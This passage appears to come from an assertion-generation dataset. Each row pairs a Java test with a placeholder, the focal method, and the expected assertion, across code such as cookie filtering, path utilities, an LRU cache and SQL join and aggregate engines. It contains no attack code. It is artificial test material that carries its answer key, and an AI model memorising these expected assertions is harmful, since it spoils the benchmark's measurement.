translate(@NotNull String text) { List<String> lines = text.lines().collect(Collectors.toList());  ToolIO.reset(); ToolIO.setMode(ToolIO.TOOL); PcalParams.resetParams();  List<String> translated = trans.performTranslation(lines); if (translated != null) { return new Result(true, Arrays.asList(ToolIO.getAllMessages()), StringUtil.joinLines(translated)); }  return new Result(false, Arrays.asList(ToolIO.getAllMessages()), null); }"	assertEquals(expected, actual)
"Exception { when(loginInfo.isLoggedIn()).thenReturn(true); ""<AssertPlaceHolder>""; }
preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { if (loginInfoProvider.get().isLoggedIn()) { return true; } else { response.sendRedirect(request.getContextPath() + ""/accessdenied""); return false; } }"	assertThat(interceptor.preHandle(null, null, null), is(true))
"simple() { AnnotationConfigApplicationContext ac = new AnnotationConfigApplicationContext(AppConfig.class); Hello h = ac.getBean(Hello.class); h.sayHello(); ""<AssertPlaceHolder>""; }
sayHello() { System.out.println(""Hello""); }"	"assertThat(h.getHello(), is(""Hello Toby""))"
"Exception { init(); config(true, false, 100); Connection con1 = datasource.getConnection(); Connection con2 = datasource.getConnection(); for (int i = 0; i < 120; i++) { Connection con = (i % 2 == 0) ? con1 : con2; PreparedStatement ps = con.prepareStatement(""select "" + i); ps.close(); } Assert.""<AssertPlaceHolder>""; con1.close(); con2.close(); }
getCacheSize() { return cacheSize; }"	assertEquals(100, interceptor.getCacheSize().get())
"test07() { // Simple SSO case Assert.""<AssertPlaceHolder>""; }
filter(String cookieHeader, String sessionId) {  StringBuilder sb = new StringBuilder(cookieHeader.length());  // Cookie name value pairs are ';' separated. // Session IDs don't use ; in the value so don't worry about quoted // values that contain ; StringTokenizer st = new StringTokenizer(cookieHeader, "";"");  boolean first = true; while (st.hasMoreTokens()) { if (first) { first = false; } else { sb.append(';'); } sb.append(filterNameValuePair(st.nextToken(), sessionId)); }   return sb.toString(); }"	"assertEquals(Constants.SINGLE_SIGN_ON_COOKIE + ""=[obfuscated]"", CookieFilter.filter(Constants.SINGLE_SIGN_ON_COOKIE + ""=0123456789"", null))"
"test08() { // Simple case String id = ""0123456789""; String cookie = ""JSESSIONID="" + id; Assert.""<AssertPlaceHolder>""; }
filter(String cookieHeader, String sessionId) {  StringBuilder sb = new StringBuilder(cookieHeader.length());  // Cookie name value pairs are ';' separated. // Session IDs don't use ; in the value so don't worry about quoted // values that contain ; StringTokenizer st = new StringTokenizer(cookieHeader, "";"");  boolean first = true; while (st.hasMoreTokens()) { if (first) { first = false; } else { sb.append(';'); } sb.append(filterNameValuePair(st.nextToken(), sessionId)); }   return sb.toString(); }"	assertEquals(cookie, CookieFilter.filter(cookie, id))
"test09() { // Simple SSO case String id = ""0123456789""; String cookie = Constants.SINGLE_SIGN_ON_COOKIE + ""="" + id; Assert.""<AssertPlaceHolder>""; }
filter(String cookieHeader, String sessionId) {  StringBuilder sb = new StringBuilder(cookieHeader.length());  // Cookie name value pairs are ';' separated. // Session IDs don't use ; in the value so don't worry about quoted // values that contain ; StringTokenizer st = new StringTokenizer(cookieHeader, "";"");  boolean first = true; while (st.hasMoreTokens()) { if (first) { first = false; } else { sb.append(';'); } sb.append(filterNameValuePair(st.nextToken(), sessionId)); }   return sb.toString(); }"	assertEquals(cookie, CookieFilter.filter(cookie, id))
"testRemoveFirstPart() { final String path = ""/some/path/{param}""; ""<AssertPlaceHolder>""; }
removeFirstPart(final String path) { return path.replaceFirst(""/[^/]+"", """"); }"	"assertEquals(""/path/{param}"", PathUtils.removeFirstPart(path))"
"testCleanPathAndRemoveFirstElement() { final String path = ""/some/path/with/{params}/and/extension.ext""; ""<AssertPlaceHolder>""; }
cleanPathAndRemoveFirstElement(final String path) { return cleanPath(removeExtension(removeFirstPart(path))); }"	"assertEquals(""/path/with/and/extension"", PathUtils.cleanPathAndRemoveFirstElement(path))"
"testRemoveBraces() { final String path = ""path/with/{braces}/{braces2}/""; ""<AssertPlaceHolder>""; }
removeBraces(final String path) { return path.replaceAll(""[{}]"", """"); }"	"assertEquals(""path/with/braces/braces2/"", PathUtils.removeBraces(path))"
"testRemoveTrailingPathParam() { final String pathWithTrailingParam = ""some/path/with/{multiple}/trailing/{param}""; ""<AssertPlaceHolder>""; }
removeTrailingPathParam(final String path) { return path.replaceFirst(""/\\{[^}]+}"	"assertEquals(""some/path/with/{multiple}/trailing"", PathUtils.removeTrailingPathParam(pathWithTrailingParam))"
"testIsInstanceOperation() { CodegenOperation instanceCo = new CodegenOperation(); instanceCo.path = ""http://twilio.com/Account/{Sid}/History/{TestInteger}""; ""<AssertPlaceHolder>""; }
isInstanceOperation(final CodegenOperation operation) { if (operation.vendorExtensions.containsKey(PATH_TYPE_EXTENSION_NAME)) { return operation.vendorExtensions .get(PATH_TYPE_EXTENSION_NAME) .equals(PathType.INSTANCE.getValue()); } else { String[] paths = operation.path.split("".json""); String lastElement = paths[paths.length - 1]; return lastElement.charAt(lastElement.length() - 1) == '}'; }"	assertTrue(PathUtils.isInstanceOperation(instanceCo))
"sizeTest() { Set<Integer> original = Set.of(0, 1, 5, 6, 7, -5); ListSet<Integer> toTest = new ListSet<>(original);  ""<AssertPlaceHolder>""; }
size() { return size; }"	assertEquals(original.size(), toTest.size())
"IOException { MatProvider.enableTracking(); File dest = new File(""target/output.jpg""); PreviewGenerator gen = new PreviewGenerator(TILE_SIZE, 3, 3); try (VideoFile video = Videos.open(BIG_BUCK_BUNNY2_PATH)) { gen.save(video, dest); } MatProvider.printLeaks(); ""<AssertPlaceHolder>""; }
save(VideoFile video, File outputFile) throws IOException { BufferedImage image = preview(video); ImageUtils.save(outputFile, image); }"	"assertFalse(""There should not be any leaked mats"", MatProvider.hasLeaks())"
"testPreview() { MatProvider.enableTracking(); PreviewGenerator gen = new PreviewGenerator(TILE_SIZE, 6, 3); try (VideoFile video = Videos.open(BIG_BUCK_BUNNY2_PATH)) { ImageUtils.show(gen.preview(video)); } sleep(250); MatProvider.printLeaks(); ""<AssertPlaceHolder>""; }
preview(VideoFile video) { return preview(video, null); }"	"assertFalse(""There should not be any leaked mats"", MatProvider.hasLeaks())"
"testVVSPreview() { MatProvider.enableTracking(); PreviewGenerator gen = new PreviewGenerator(TILE_SIZE, 6, 3); try (VideoFile video = Videos.open(BIG_BUCK_BUNNY_VVS_PATH)) { ImageUtils.show(gen.preview(video)); } sleep(250); MatProvider.printLeaks(); ""<AssertPlaceHolder>""; }
preview(VideoFile video) { return preview(video, null); }"	"assertFalse(""There should not be any leaked mats"", MatProvider.hasLeaks())"
"testSetInsertsValue() { LRUCache<CacheValue> cache = new LRUCache<>(100); CacheValue cacheValue = new CacheValue(""ABC""); String key = ""key""; cache.set(key, cacheValue); CacheValue actualValue = cache.get(key);  ""<AssertPlaceHolder>""; }
get(String key) { lock.lock(); try { if (!cacheMap.containsKey(key)) { return null; } Node<T> node = this.cacheMap.get(key);  updateCacheNodeLocked(node); return node.value; } finally { lock.unlock(); } }"	assertEquals(cacheValue, actualValue)
"testGetValueWithMultipleTypes() { LRUCache<CacheValue> cache = new LRUCache<>(100); CacheValue cacheValue = new CacheValue(""ABC""); String key = new String(""key"".getBytes()); cache.set(key, cacheValue); CacheValue actualValue = cache.get(key);  ""<AssertPlaceHolder>""; }
get(String key) { lock.lock(); try { if (!cacheMap.containsKey(key)) { return null; } Node<T> node = this.cacheMap.get(key);  updateCacheNodeLocked(node); return node.value; } finally { lock.unlock(); } }"	assertEquals(cacheValue, actualValue)
"testGetNonExistent() { LRUCache<CacheValue> cache = new LRUCache<>(100); CacheValue nobody = cache.get(""nobody"");  Assert.""<AssertPlaceHolder>""; }
get(String key) { lock.lock(); try { if (!cacheMap.containsKey(key)) { return null; } Node<T> node = this.cacheMap.get(key);  updateCacheNodeLocked(node); return node.value; } finally { lock.unlock(); } }"	assertNull(nobody)
"testClear() { LRUCache<CacheValue> cache = new LRUCache<>(100); CacheValue v1 = new CacheValue(""1""); cache.set(""k1"", v1); cache.clear();  ""<AssertPlaceHolder>""; }
size() { lock.lock(); try { return this.cacheMap.size(); } finally { lock.unlock(); } }"	assertEquals(0L, cache.size().longValue())
"InterruptedException { TopoServer topoServer = MemoryTopoFactory.newServerAndFactory(""cell1"", ""cell2"").getTopoServer(); startWatchTopo(""k"", topoServer, ""cell1"", ""cell2""); topoServer.addKeyspace(""k""); topoServer.startTickerReloadCell(globalContext);  printComment(""10. HealthCheck Test Primary in other cell""); printComment(""a. Get Health""); HealthCheck hc = getHealthCheck();  printComment(""b. Add a no-serving primary Tablet in different cell""); MockTablet mockTablet = MockTablet.buildMockTablet(grpcCleanup, ""cell2"", 0, ""a"", ""k"", ""s"", portMap, Topodata.TabletType.MASTER); hc.addTablet(mockTablet.getTablet()); sleepMillisSeconds(200);  printComment(""c. Modify the status of Tablet to serving""); sendOnNextMessage(mockTablet, Topodata.TabletType.MASTER, true, 0, 0.5, 0); sleepMillisSeconds(200);  printComment(""d.// check that PRIMARY tablet from other cell IS in healthy tablet list""); List<TabletHealthCheck> hcList = hc.getHealthyTabletStats(Query.Target.newBuilder().setKeyspace(""k"").setShard(""s"").setTabletType(Topodata.TabletType.MASTER).build()); Assert.""<AssertPlaceHolder>"";  MockTablet.closeQueryService(mockTablet); TopologyWatcherManager.INSTANCE.close(); topoServer.close();  printOk(); }
getHealthyTabletStats(Query.Target target) { this.lock.lock(); try { List<TabletHealthCheck> list = this.healthy.get(keyFromTarget(target)); if (null == list || list.isEmpty()) { return null; } if (target.getTabletType() == Topodata.TabletType.MASTER) { return list; }  List<TabletHealthCheck> servlist = new ArrayList<>(list.size()); list.forEach(entry -> { if (entry.getServing().get()) { servlist.add(entry); } }); return servlist; } finally { this.lock.unlock(); } }"	assertEquals(1, hcList.size())
"testHealthyListChecksum() { HealthCheck hc = getHealthCheck(); Topodata.Tablet tablet1 = buildTablet(""cella"", 7, ""1.1.1.7"", ""k"", ""s"", portMap, Topodata.TabletType.REPLICA); Topodata.Tablet tablet2 = buildTablet(""cella"", 8, ""1.1.1.8"", ""k"", ""s"", portMap, Topodata.TabletType.REPLICA); Query.Target target = Query.Target.newBuilder().setKeyspace(tablet1.getKeyspace()).setShard(tablet1.getShard()).setTabletType(tablet1.getType()).build();  Map<String, List<TabletHealthCheck>> healthy1 = hc.getHealthyCopy(); List<TabletHealthCheck> healthyMap1 = new ArrayList<>();  TabletHealthCheck thc1 = new TabletHealthCheck(null, tablet1, target); thc1.getServing().set(true); TabletHealthCheck thc2 = new TabletHealthCheck(null, tablet2, target); thc2.getServing().set(true);  healthyMap1.add(thc1); healthyMap1.add(thc2); healthy1.put(""k1"", healthyMap1);  Map<String, List<TabletHealthCheck>> healthy2 = hc.getHealthyCopy(); List<TabletHealthCheck> healthyMap2 = new ArrayList<>(); healthyMap2.add(thc2); healthyMap2.add(thc1); healthy2.put(""k1"", healthyMap2);  long healthy1Crc32 = HealthyCollector.stateHealthyChecksum(healthy1); long healthy2Crc32 = HealthyCollector.stateHealthyChecksum(healthy2); Assert.""<AssertPlaceHolder>""; }
getHealthyCopy() { Map<String, List<TabletHealthCheck>> treeMap = new TreeMap<>(); for (Map.Entry<String, List<TabletHealthCheck>> entry : healthy.entrySet()) { List<TabletHealthCheck> tabletHealthChecks = entry.getValue(); treeMap.put(entry.getKey(), new ArrayList<>(tabletHealthChecks)); } return treeMap; }"	"assertEquals(""Wrong HealthyChecksum"", healthy1Crc32, healthy2Crc32)"
"SQLException { @Getter @Setter @AllArgsConstructor class TestCase { String name;  VtResultSet res;  List<List<VtResultValue>> expectResult; }  List<TestCase> testCases = new ArrayList<>(2); testCases.add( new TestCase(""int32"", TestResult.makeTestResult(TestResult.makeTestFields(""a|b"", ""int32|int32""), ""0|1"", ""1|0"", ""2|3""), Collections.singletonList(Arrays.asList(new VtResultValue(1, Query.Type.INT32), new VtResultValue(0, Query.Type.INT32))))); testCases.add( new TestCase(""uint64_int64"", TestResult.makeTestResult(TestResult.makeTestFields(""a|b"", ""uint64|int64""), ""0|1"", ""1|0"", ""2|3""), Collections.singletonList(Arrays.asList(new VtResultValue(new BigInteger(""1""), Query.Type.UINT64), new VtResultValue(0L, Query.Type.INT64)))));  Comparisons.ComparisonExpr predicate = new Comparisons.ComparisonExpr(new Comparisons.CompareGT(), new EvalEngine.Column(0), new EvalEngine.Column(1)); for (TestCase tc : testCases) { FilterGen4Engine filterGen4Engine = new FilterGen4Engine(); filterGen4Engine.setPredicate(predicate); filterGen4Engine.setInput(new FakePrimitive(Collections.singletonList(tc.getRes()))); VtResultSet rowList = (VtResultSet) filterGen4Engine.execute(null, null, null, false).getVtRowList();  Assert.""<AssertPlaceHolder>""; } }
execute(IContext ctx, Vcursor vcursor, Map<String, BindVariable> bindVariableMap, boolean wantFields) throws SQLException { IExecute.ExecuteMultiShardResponse result = this.getInput().execute(ctx, vcursor, bindVariableMap, wantFields); if (this.predicate == null) { return result; }  EvalEngine.ExpressionEnv env = new EvalEngine.ExpressionEnv(bindVariableMap); List<List<VtResultValue>> newResultRows = new ArrayList<>();  VtResultSet resultSet = (VtResultSet) result.getVtRowList(); for (List<VtResultValue> rv : resultSet.getRows()) { env.setRow(rv); EvalResult evalResult = this.predicate.evaluate(env); long intEvalResult = evalResult.value().toInt(); if (intEvalResult == EvalEngine.TRUE_FLAG) { newResultRows.add(rv); } } resultSet.setRows(newResultRows); return result; }"	assertEquals(tc.getExpectResult(), rowList.getRows())
"SQLException { int saveMax = FakeVcursorUtil.testMaxMemoryRows;  boolean saveIgnore = FakeVcursorUtil.testIgnoreMaxMemoryRows;  FakeVcursorUtil.testMaxMemoryRows = 3; @Getter @AllArgsConstructor class TestCase { boolean ignoreMaxMemoryRows;  String err; } List<TestCase> testCases = new ArrayList<>(); testCases.add(new TestCase(true, null)); testCases.add(new TestCase(false, ""in-memory row count exceeded allowed limit of 3""));  for (TestCase tc : testCases) { Query.Field[] leftField = TestResult.makeTestFields(""col1|col2|col3"", ""int64|varchar|varchar""); VtResultSet leftResultSet = TestResult.makeTestResult(leftField, ""1|a|aa"", ""2|b|bb"", ""3|c|cc""); FakePrimitive leftPrim = new FakePrimitive(Lists.newArrayList(leftResultSet)); Query.Field[] rightField = TestResult.makeTestFields(""col4|col5|col6"", ""int64|varchar|varchar""); List<VtResultSet> rightResultSet = new ArrayList<>(); rightResultSet.add(TestResult.makeTestResult(rightField, ""4|d|dd"")); rightResultSet.add(TestResult.makeTestResult(rightField)); rightResultSet.add(TestResult.makeTestResult(rightField, ""5|e|ee"", ""6|f|ff"", ""7|g|gg"")); FakePrimitive rightPrim = new FakePrimitive(rightResultSet); Map<String, BindVariable> bv = new HashMap<>(); bv.put(""a"", SqlTypes.int64BindVariable(10L)); // Normal join Map<String, Integer> vars = new HashMap<>(); vars.put(""bv"", 1); JoinGen4Engine jn = new JoinGen4Engine(Engine.JoinOpcode.NormalJoin, vars); jn.setLeft(leftPrim); jn.setRight(rightPrim); jn.setCols(Lists.newArrayList(-1, -2, 1, 2));  FakeVcursorUtil.testIgnoreMaxMemoryRows = tc.ignoreMaxMemoryRows; try { jn.execute(VtContext.background(), new NoopVCursor(), bv, true); if (!FakeVcursorUtil.testIgnoreMaxMemoryRows) { Assert.fail("" testJoinExecuteMaxMemoryRows   is FAIL""); } } catch (SQLException e) { if (!FakeVcursorUtil.testIgnoreMaxMemoryRows) { Assert.""<AssertPlaceHolder>""; } else { throw e; } } } FakeVcursorUtil.testMaxMemoryRows = saveMax; FakeVcursorUtil.testIgnoreMaxMemoryRows = saveIgnore;  }
execute(IContext ctx, Vcursor vcursor, Map<String, BindVariable> bindVariableMap, boolean wantFields) throws SQLException { Map<String, BindVariable> joinVars = new LinkedHashMap<>();  IExecute.ExecuteMultiShardResponse leftResultResponse = this.left.execute(ctx, vcursor, bindVariableMap, wantFields);  VtRowList leftRowList = leftResultResponse.getVtRowList(); if (leftRowList == null) { throw new SQLException(""VtRowList is null""); }  VtResultSet resultSet = new VtResultSet();  VtResultSet leftResult = (VtResultSet) leftRowList; if ((leftResult.getRows() == null || leftResult.getRows().isEmpty()) && wantFields) { for (Map.Entry<String, Integer> entry : this.vars.entrySet()) { joinVars.put(entry.getKey(), BindVariable.NULL_BIND_VARIABLE); } VtResultSet rightResult = this.right.getFields(vcursor, combineVars(bindVariableMap, joinVars)); resultSet.setFields(joinFields(leftResult.getFields(), rightResult.getFields(), this.cols)); return new IExecute.ExecuteMultiShardResponse(resultSet); }  if (leftResult.getRows() != null) { for (List<VtResultValue> leftRow : leftResult.getRows()) { for (Map.Entry<String, Integer> entry : this.vars.entrySet()) { joinVars.put(entry.getKey(), SqlTypes.valueBindVariable(leftRow.get(entry.getValue()))); }  IExecute.ExecuteMultiShardResponse rightResultResponse = this.right.execute(ctx, vcursor, combineVars(bindVariableMap, joinVars), wantFields);  VtRowList rightRowList = rightResultResponse.getVtRowList(); if (rightRowList == null) { throw new SQLException(""VtRowList is null""); }  VtResultSet rightResult = (VtResultSet) rightRowList;  if (wantFields) { wantFields = false; resultSet.setFields(joinFields(leftResult.getFields(), rightResult.getFields(), this.cols)); }  for (List<VtResultValue> rightRow : rightResult.getRows()) { resultSet.getRows().add(joinRows(leftRow, rightRow, this.cols)); } if (this.opcode == Engine.JoinOpcode.LeftJoin && CollectionUtils.isEmpty(rightResult.getRows())) { resultSet.getRows().add(joinRows(leftRow, null, this.cols)); } if (vcursor.exceedsMaxMemoryRows(resultSet.getRows().size())) { throw new SQLException(""in-memory row count exceeded allowed limit of "" + vcursor.maxMemoryRows()); } } } return new IExecute.ExecuteMultiShardResponse(resultSet); }"	"assertEquals(printFail("" testJoinExecuteMaxMemoryRows   is FAIL""), tc.err, e.getMessage())"
"SQLException { Query.Field[] leftField = TestResult.makeTestFields(""col1|col2|col3"", ""int64|varchar|varchar""); VtResultSet leftResultSet = TestResult.makeTestResult(leftField); FakePrimitive leftPrim = new FakePrimitive(Lists.newArrayList(leftResultSet)); Query.Field[] rightField = TestResult.makeTestFields(""col4|col5|col6"", ""int64|varchar|varchar""); VtResultSet rightResultSet = TestResult.makeTestResult(rightField); FakePrimitive rightPrim = new FakePrimitive(Lists.newArrayList(rightResultSet)); Map<String, Integer> vars = new HashMap<>(); vars.put(""bv"", 1); JoinGen4Engine jn = new JoinGen4Engine(Engine.JoinOpcode.NormalJoin, vars); jn.setLeft(leftPrim); jn.setRight(rightPrim); jn.setCols(Lists.newArrayList(-1, -2, 1, 2)); IExecute.ExecuteMultiShardResponse result = jn.execute(VtContext.background(), new NoopVCursor(), null, true); leftPrim.expectLog(Lists.newArrayList(""Execute  true"")); rightPrim.expectLog(Lists.newArrayList(""GetFields bv: "", ""Execute bv:  true""));  Query.Field[] expectResultField = TestResult.makeTestFields(""col1|col2|col4|col5"", ""int64|varchar|int64|varchar""); VtResultSet expectResultSet = TestResult.makeTestResult(expectResultField); Assert.""<AssertPlaceHolder>""; }
execute(IContext ctx, Vcursor vcursor, Map<String, BindVariable> bindVariableMap, boolean wantFields) throws SQLException { Map<String, BindVariable> joinVars = new LinkedHashMap<>();  IExecute.ExecuteMultiShardResponse leftResultResponse = this.left.execute(ctx, vcursor, bindVariableMap, wantFields);  VtRowList leftRowList = leftResultResponse.getVtRowList(); if (leftRowList == null) { throw new SQLException(""VtRowList is null""); }  VtResultSet resultSet = new VtResultSet();  VtResultSet leftResult = (VtResultSet) leftRowList; if ((leftResult.getRows() == null || leftResult.getRows().isEmpty()) && wantFields) { for (Map.Entry<String, Integer> entry : this.vars.entrySet()) { joinVars.put(entry.getKey(), BindVariable.NULL_BIND_VARIABLE); } VtResultSet rightResult = this.right.getFields(vcursor, combineVars(bindVariableMap, joinVars)); resultSet.setFields(joinFields(leftResult.getFields(), rightResult.getFields(), this.cols)); return new IExecute.ExecuteMultiShardResponse(resultSet); }  if (leftResult.getRows() != null) { for (List<VtResultValue> leftRow : leftResult.getRows()) { for (Map.Entry<String, Integer> entry : this.vars.entrySet()) { joinVars.put(entry.getKey(), SqlTypes.valueBindVariable(leftRow.get(entry.getValue()))); }  IExecute.ExecuteMultiShardResponse rightResultResponse = this.right.execute(ctx, vcursor, combineVars(bindVariableMap, joinVars), wantFields);  VtRowList rightRowList = rightResultResponse.getVtRowList(); if (rightRowList == null) { throw new SQLException(""VtRowList is null""); }  VtResultSet rightResult = (VtResultSet) rightRowList;  if (wantFields) { wantFields = false; resultSet.setFields(joinFields(leftResult.getFields(), rightResult.getFields(), this.cols)); }  for (List<VtResultValue> rightRow : rightResult.getRows()) { resultSet.getRows().add(joinRows(leftRow, rightRow, this.cols)); } if (this.opcode == Engine.JoinOpcode.LeftJoin && CollectionUtils.isEmpty(rightResult.getRows())) { resultSet.getRows().add(joinRows(leftRow, null, this.cols)); } if (vcursor.exceedsMaxMemoryRows(resultSet.getRows().size())) { throw new SQLException(""in-memory row count exceeded allowed limit of "" + vcursor.maxMemoryRows()); } } } return new IExecute.ExecuteMultiShardResponse(resultSet); }"	"assertEquals(printFail("" testJoinExecuteNoResult   is FAIL""), expectResultSet, result.getVtRowList())"
"SQLException { Query.Field[] leftField = TestResult.makeTestFields(""col1|col2|col3"", ""int64|varchar|varchar""); VtResultSet leftResultSet = TestResult.makeTestResult(leftField); FakePrimitive leftPrim = new FakePrimitive(Lists.newArrayList(leftResultSet)); Query.Field[] rightField = TestResult.makeTestFields(""col4|col5|col6"", ""int64|varchar|varchar""); VtResultSet rightResultSet = TestResult.makeTestResult(rightField); FakePrimitive rightPrim = new FakePrimitive(Lists.newArrayList(rightResultSet)); Map<String, Integer> vars = new HashMap<>(); vars.put(""bv"", 1); JoinGen4Engine jn = new JoinGen4Engine(Engine.JoinOpcode.NormalJoin, vars); jn.setLeft(leftPrim); jn.setRight(rightPrim); jn.setCols(Lists.newArrayList(-1, -2, 1, 2)); VtResultSet fields = jn.getFields(null, null); leftPrim.expectLog(Lists.newArrayList(""GetFields "", ""Execute  true"")); rightPrim.expectLog(Lists.newArrayList(""GetFields bv: "", ""Execute bv:  true"")); Query.Field[] expectResultField = TestResult.makeTestFields(""col1|col2|col4|col5"", ""int64|varchar|int64|varchar""); VtResultSet expectResultSet = TestResult.makeTestResult(expectResultField); Assert.""<AssertPlaceHolder>""; }
getFields(Vcursor vcursor, Map<String, BindVariable> bindvars) throws SQLException { Map<String, BindVariable> joinVars = new HashMap<>(); VtResultSet resultSet = new VtResultSet(); VtResultSet leftResult = this.left.getFields(vcursor, bindvars); for (Map.Entry<String, Integer> var : this.vars.entrySet()) { joinVars.put(var.getKey(), BindVariable.NULL_BIND_VARIABLE); } VtResultSet rightResult = this.right.getFields(vcursor, combineVars(bindvars, joinVars)); resultSet.setFields(joinFields(leftResult.getFields(), rightResult.getFields(), this.cols)); return resultSet; }"	"assertEquals(printFail("" testGetFields   is FAIL""), expectResultSet, fields)"
"SQLException { Query.Field[] fields = TestResult.makeTestFields(""col1|col2"", ""varchar|int64""); VtResultSet inputResult = TestResult.makeTestResult(fields); LimitGen4Engine l1 = new LimitGen4Engine(); l1.setInput(new FakePrimitive(Collections.singletonList(inputResult)));  VtResultSet resultSet = l1.getFields(null, new HashMap<>()); Assert.""<AssertPlaceHolder>""; }
getFields(Vcursor vcursor, Map<String, BindVariable> bindValues) throws SQLException { return this.input.getFields(vcursor, bindValues); }"	assertEquals(inputResult, resultSet)
"SQLException { Query.Field[] fields = TestResult.makeTestFields(""col1|col2"", ""int64|varchar""); VtResultSet resultSet = TestResult.makeTestResult(fields); FakePrimitive fp = new FakePrimitive(Lists.newArrayList(resultSet));  MemorySortGen4Engine ms = new MemorySortGen4Engine(null, fp); VtResultSet got = ms.getFields(null, null); Assert.""<AssertPlaceHolder>""; }
getFields(Vcursor vcursor, Map<String, BindVariable> bindValues) throws SQLException { return this.input.getFields(vcursor, bindValues); }"	assertEquals(resultSet, got)
"SQLException { Query.Field[] fields = TestResult.makeTestFields(""c1|c2|c3"", ""varbinary|decimal|int64""); VtResultSet resultSet = TestResult.makeTestResult(fields, ""a|1|1"", ""g|2|1"", ""a|1|1"", ""c|4|1"", ""c|3|1""); FakePrimitive fp = new FakePrimitive(Lists.newArrayList(resultSet));  OrderByParamsGen4 orderByParamsGen4 = new OrderByParamsGen4(1, false, -1, null); MemorySortGen4Engine ms = new MemorySortGen4Engine(Lists.newArrayList(orderByParamsGen4), fp); ms.setTruncateColumnCount(2);  VtResultSet result = (VtResultSet) ms.execute(VtContext.background(), new NoopVCursor(), null, false).getVtRowList(); VtResultSet wantResult = TestResult.makeTestResult(new Query.Field[] {fields[0], fields[1]}, ""a|1"", ""a|1"", ""g|2"", ""c|3"", ""c|4""); Assert.""<AssertPlaceHolder>""; }
execute(IContext ctx, Vcursor vcursor, Map<String, BindVariable> bindVariableMap, boolean wantFields) throws SQLException { int count = this.fetchCount(bindVariableMap);  IExecute.ExecuteMultiShardResponse response = this.input.execute(ctx, vcursor, bindVariableMap, wantFields);  VtResultSet resultSet = (VtResultSet) response.getVtRowList(); return getExecuteMultiShardResponse(count, resultSet); }"	assertEquals(wantResult, result)
"SQLException { Query.Field[] fields = TestResult.makeTestFields(""col|count(*)"", ""varbinary|decimal""); VtResultSet resultSet = TestResult.makeTestResult(fields, ""a|1"", ""a|1"", ""b|2"", ""c|3"", ""c|4""); FakePrimitive fp = new FakePrimitive(Lists.newArrayList(resultSet));  AbstractAggregateGen4.AggregateParams aggr = new AbstractAggregateGen4.AggregateParams(Engine.AggregateOpcodeG4.AggregateSum, 1); GroupByParams groupByParams = new GroupByParams(); groupByParams.setKeyCol(0); OrderedAggregateGen4Engine oa = new OrderedAggregateGen4Engine(false, Lists.newArrayList(aggr), false, 0, Lists.newArrayList(groupByParams), null, fp);  VtResultSet result = (VtResultSet) oa.execute(VtContext.background(), null, null, false).getVtRowList();  VtResultSet wantResult = TestResult.makeTestResult(fields, ""a|2"", ""b|2"", ""c|7""); Assert.""<AssertPlaceHolder>""; }
execute(IContext ctx, Vcursor vcursor, Map<String, BindVariable> bindVariableMap, boolean wantFields) throws SQLException { IExecute.ExecuteMultiShardResponse resultResponse = this.input.execute(ctx, vcursor, bindVariableMap, wantFields); VtResultSet result = (VtResultSet) resultResponse.getVtRowList();  VtResultSet out = new VtResultSet(convertFields(result.getFields(), super.preProcess, super.aggregates, super.aggrOnEngine), new ArrayList<>());  // This code is similar to the one in StreamExecute. List<VtResultValue> current = null; List<VtResultValue> curDistincts = null; for (List<VtResultValue> row : result.getRows()) { if (current == null) { Pair<List<VtResultValue>, List<VtResultValue>> pair = convertRow(row, super.preProcess, super.aggregates, super.aggrOnEngine); current = pair.getLeft(); curDistincts = pair.getRight(); continue; } boolean equal = this.keysEqual(current, row); if (equal) { Pair<List<VtResultValue>, List<VtResultValue>> pair = merge(result.getFields(), current, row, curDistincts, super.collations, super.aggregates); current = pair.getLeft(); curDistincts = pair.getRight(); continue; } out.getRows().add(current); Pair<List<VtResultValue>, List<VtResultValue>> pair = convertRow(row, super.preProcess, super.aggregates, super.aggrOnEngine); current = pair.getLeft(); curDistincts = pair.getRight(); } if (current != null) { List<VtResultValue> finalValues = convertFinal(current, super.aggregates); out.getRows().add(finalValues); } return new IExecute.ExecuteMultiShardResponse(out.truncate(super.truncateColumnCount)); }"	assertEquals(wantResult, result)
"SQLException { Query.Field[] fields = TestResult.makeTestFields(""col|count(*)|weight_string(col)"", ""varchar|decimal|varbinary""); VtResultSet resultSet = TestResult.makeTestResult(fields, ""a|1|A"", ""A|1|A"", ""b|2|B"", ""C|3|C"", ""c|4|C""); FakePrimitive fp = new FakePrimitive(Lists.newArrayList(resultSet));  AbstractAggregateGen4.AggregateParams aggr = new AbstractAggregateGen4.AggregateParams(Engine.AggregateOpcodeG4.AggregateSum, 1); GroupByParams groupByParams = new GroupByParams(); groupByParams.setKeyCol(2); OrderedAggregateGen4Engine oa = new OrderedAggregateGen4Engine(false, Lists.newArrayList(aggr), false, 2, Lists.newArrayList(groupByParams), null, fp);  VtResultSet result = (VtResultSet) oa.execute(VtContext.background(), null, null, false).getVtRowList();  Query.Field[] wantFields = TestResult.makeTestFields(""col|count(*)"", ""varchar|decimal""); VtResultSet wantResult = TestResult.makeTestResult(wantFields, ""a|2"", ""b|2"", ""C|7""); Assert.""<AssertPlaceHolder>""; }
execute(IContext ctx, Vcursor vcursor, Map<String, BindVariable> bindVariableMap, boolean wantFields) throws SQLException { IExecute.ExecuteMultiShardResponse resultResponse = this.input.execute(ctx, vcursor, bindVariableMap, wantFields); VtResultSet result = (VtResultSet) resultResponse.getVtRowList();  VtResultSet out = new VtResultSet(convertFields(result.getFields(), super.preProcess, super.aggregates, super.aggrOnEngine), new ArrayList<>());  // This code is similar to the one in StreamExecute. List<VtResultValue> current = null; List<VtResultValue> curDistincts = null; for (List<VtResultValue> row : result.getRows()) { if (current == null) { Pair<List<VtResultValue>, List<VtResultValue>> pair = convertRow(row, super.preProcess, super.aggregates, super.aggrOnEngine); current = pair.getLeft(); curDistincts = pair.getRight(); continue; } boolean equal = this.keysEqual(current, row); if (equal) { Pair<List<VtResultValue>, List<VtResultValue>> pair = merge(result.getFields(), current, row, curDistincts, super.collations, super.aggregates); current = pair.getLeft(); curDistincts = pair.getRight(); continue; } out.getRows().add(current); Pair<List<VtResultValue>, List<VtResultValue>> pair = convertRow(row, super.preProcess, super.aggregates, super.aggrOnEngine); current = pair.getLeft(); curDistincts = pair.getRight(); } if (current != null) { List<VtResultValue> finalValues = convertFinal(current, super.aggregates); out.getRows().add(finalValues); } return new IExecute.ExecuteMultiShardResponse(out.truncate(super.truncateColumnCount)); }"	assertEquals(wantResult, result)
